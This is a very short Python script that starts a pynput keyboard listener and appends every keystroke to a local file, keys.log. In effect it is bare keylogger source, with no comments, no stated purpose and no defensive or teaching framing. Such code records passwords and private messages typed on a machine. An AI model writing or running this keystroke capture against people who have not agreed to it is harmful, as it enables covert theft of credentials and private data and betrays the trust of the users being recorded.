from pynput import keyboard

def on_press(key):
    with open("keys.log", "a") as f:
        f.write(str(key))

keyboard.Listener(on_press=on_press).start()
